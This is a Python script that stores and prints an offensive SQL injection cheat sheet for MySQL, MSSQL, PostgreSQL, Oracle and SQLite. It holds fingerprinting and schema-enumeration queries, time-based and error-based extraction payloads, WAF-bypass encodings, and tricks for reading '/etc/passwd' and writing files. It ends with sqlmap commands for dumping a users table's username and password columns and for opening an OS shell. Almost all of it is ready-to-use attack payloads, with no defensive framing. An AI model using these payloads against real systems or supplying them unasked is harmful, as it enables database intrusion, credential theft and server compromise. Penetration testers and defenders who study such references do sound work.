"""Static reference tables for SQL injection work."""

FINGERPRINT = {
    "MySQL":      "SELECT @@version",
    "MSSQL":      "SELECT @@version",
    "PostgreSQL": "SELECT version()",
    "Oracle":     "SELECT banner FROM v$version WHERE ROWNUM=1",
    "SQLite":     "SELECT sqlite_version()",
}

SESSION_INFO = {
    "MySQL":      "SELECT current_user(), database(), @@hostname",
    "MSSQL":      "SELECT SUSER_NAME(), DB_NAME(), @@SERVERNAME",
    "PostgreSQL": "SELECT current_user, current_database(), inet_server_addr()",
    "Oracle":     "SELECT USER, ora_database_name FROM dual",
    "SQLite":     "SELECT sqlite_version()",
}

COMMENT_SYNTAX = {
    "MySQL":      "-- -   |  #   |  /* */",
    "MSSQL":      "-- -   |  /* */",
    "PostgreSQL": "-- -   |  /* */",
    "Oracle":     "-- -   |  /* */",
    "SQLite":     "-- -   |  /* */",
}

CONCAT_SYNTAX = {
    "MySQL":      "CONCAT(a, b, c) - any arg count, NULL poisons result",
    "PostgreSQL": "a || b || c  or  CONCAT(a, b, c) - CONCAT skips NULL",
    "MSSQL":      "a + b  (needs CAST for numbers)  or  CONCAT(a, b, c)",
    "Oracle":     "a || b || c - CONCAT() takes EXACTLY 2 args",
    "SQLite":     "a || b || c - CONCAT since 3.44",
}

SUBSTR_SYNTAX = {
    "MySQL":      "SUBSTRING(s, N, 1)   /  ASCII()",
    "PostgreSQL": "SUBSTRING(s, N, 1)   /  ASCII()",
    "MSSQL":      "SUBSTRING(s, N, 1)   /  ASCII()",
    "Oracle":     "SUBSTR(s, N, 1)      /  ASCII()",
    "SQLite":     "SUBSTR(s, N, 1)      /  UNICODE()",
}

LENGTH_SYNTAX = {
    "MySQL":      "LENGTH(s)",
    "PostgreSQL": "LENGTH(s)",
    "MSSQL":      "LEN(s)",
    "Oracle":     "LENGTH(s)",
    "SQLite":     "LENGTH(s)",
}

SLEEP_SYNTAX = {
    "MySQL":      "SLEEP(5)",
    "PostgreSQL": "pg_sleep(5)",
    "MSSQL":      "WAITFOR DELAY '0:0:5'",
    "Oracle":     "dbms_pipe.receive_message(('a'),5)",
    "SQLite":     "(SELECT 1 FROM (SELECT 1) WHERE 1=randomblob(100000000))",
}

HEAVY_QUERY = {
    "MySQL":      "BENCHMARK(10000000, MD5('a'))",
    "PostgreSQL": "generate_series(1,10000000)",
    "MSSQL":      "WAITFOR DELAY '0:0:5'",
    "Oracle":     "dbms_pipe.receive_message(('a'),5)",
    "SQLite":     "randomblob(100000000)",
}

TABLES_QUERY = {
    "MySQL":      "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
    "PostgreSQL": "SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema()",
    "MSSQL":      "SELECT TOP 1 table_name FROM information_schema.tables",
    "Oracle":     "SELECT table_name FROM user_tables",
    "SQLite":     "SELECT name FROM sqlite_master WHERE type='table'",
}

COLUMNS_QUERY = {
    "MySQL":      "SELECT column_name FROM information_schema.columns WHERE table_name='users'",
    "PostgreSQL": "SELECT column_name FROM information_schema.columns WHERE table_name='users'",
    "MSSQL":      "SELECT column_name FROM information_schema.columns WHERE table_name='users'",
    "Oracle":     "SELECT column_name FROM user_tab_columns WHERE table_name='USERS'",
    "SQLite":     "SELECT name FROM pragma_table_info('users')",
}

INFO_SCHEMA_ALTERNATIVES = {
    "MySQL":      "sys.schema_table_statistics | mysql.innodb_table_stats",
    "MSSQL":      "sys.tables | sys.objects WHERE type='U' | sys.columns",
    "PostgreSQL": "pg_catalog.pg_tables | pg_class WHERE relkind='r' | pg_attribute",
    "Oracle":     "all_tables | all_tab_columns | dba_tables",
    "SQLite":     "sqlite_master",
}

ERROR_BASED = {
    "MySQL":      "AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT ...)))",
    "MSSQL":      "AND 1=CONVERT(int,(SELECT ...))",
    "PostgreSQL": "AND 1=CAST((SELECT ...) AS int)",
    "Oracle":     "AND 1=CTXSYS.DRITHSX.SN(1,(SELECT ...))",
    "SQLite":     "no native error-based, use blind",
}

WAF_BYPASS = {
    "Spaces":             "/**/   |   %09   |   %0a   |   +",
    "UNION SELECT":       "UNION/**/SELECT   |   UNION%0aSELECT   |   UnIoN sElEcT",
    "Quotes":             "0x68656c6c6f (hex)   |   CHAR(104,101,...)",
    "OR / AND":           "||   |   &&   |   %09OR%09",
    "Equal sign":         "LIKE   |   REGEXP   |   BETWEEN   |   IN",
    "Comments":           "-- -   |   #   |   /*   |   ;%00",
    "Parentheses":        "%28   |   %29",
    "information_schema": "sys.* (MSSQL), pg_catalog (PG) - see alternatives",
}

STRING_REPR = {
    "Hex":          "0x7573657273   (= users)",
    "CHAR (MySQL)": "CHAR(117,115,101,114,115)",
    "UNHEX":        "UNHEX('7573657273')",
    "CHR (PG)":     "CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(115)",
    "Base64":       "FROM_BASE64('dXNlcg==')  (MySQL)",
}

MYSQL_TRICKS = {
    "End-of-line comment": "' OR 1=1-- -",
    "GROUP BY errors":     "GROUP BY CONCAT(version(), FLOOR(RAND(0)*2))",
    "Blind ORDER BY":      "ORDER BY IF(cond,1,2)",
    "Row by row":          "LIMIT 1 OFFSET N",
    "UNION with ints":     "UNION SELECT 1,2,3",
    "Check privileges":    "SELECT current_user",
    "Read file":           "LOAD_FILE('/etc/passwd')",
    "Write file":          "... INTO OUTFILE '/tmp/x'",
}

SYSTEM_FUNCS = {
    "MySQL":      "@@version_comment | @@datadir | @@basedir | USER() | SYSTEM_USER()",
    "MSSQL":      "IS_SRVROLEMEMBER('sysadmin') | @@SERVERNAME",
    "PostgreSQL": "current_setting('data_directory')",
    "Oracle":     "SYS_CONTEXT('USERENV','DB_NAME')",
    "SQLite":     "sqlite_version()",
}

SQLMAP_CMDS = [
    ("Basic probe",           'sqlmap -u "http://target/?id=1"'),
    ("POST + cookie",         'sqlmap -u "http://target/" --data="id=1" --cookie="sess=x"'),
    ("From Burp request",     "sqlmap -r req.txt"),
    ("Dump all",              'sqlmap -u "..." --dump'),
    ("Tables only",           'sqlmap -u "..." --tables'),
    ("Columns of table",      'sqlmap -u "..." -T users --columns'),
    ("Dump specific columns", 'sqlmap -u "..." -T users -C username,password --dump'),
    ("Technique B/T/U/E/S",   'sqlmap -u "..." --technique=BT'),
    ("Level / risk",          'sqlmap -u "..." --level=5 --risk=3'),
    ("OS shell",              'sqlmap -u "..." --os-shell'),
]


def print_table(name, mapping):
    """Prints a mapping as a two-column aligned table."""
    print(f"\n== {name} ==")
    if not mapping:
        print("  (empty)")
        return
    w = max(len(str(k)) for k in mapping)
    for k, v in mapping.items():
        print(f"  {str(k):<{w}} : {v}")


def main():
    print_table("Fingerprint", FINGERPRINT)
    print_table("Session / user / database", SESSION_INFO)
    print_table("Comments", COMMENT_SYNTAX)
    print_table("Concatenation", CONCAT_SYNTAX)
    print_table("Substring / char code", SUBSTR_SYNTAX)
    print_table("Length", LENGTH_SYNTAX)
    print_table("Sleep", SLEEP_SYNTAX)
    print_table("Heavy query", HEAVY_QUERY)
    print_table("Tables query", TABLES_QUERY)
    print_table("Columns query", COLUMNS_QUERY)
    print_table("information_schema alternatives", INFO_SCHEMA_ALTERNATIVES)
    print_table("Error-based", ERROR_BASED)
    print_table("WAF bypass", WAF_BYPASS)
    print_table("String representations", STRING_REPR)
    print_table("MySQL tricks", MYSQL_TRICKS)
    print_table("System functions", SYSTEM_FUNCS)
    print("\n== sqlmap ==")
    for name, cmd in SQLMAP_CMDS:
        print(f"  {name:<22} {cmd}")


if __name__ == "__main__":
    main()
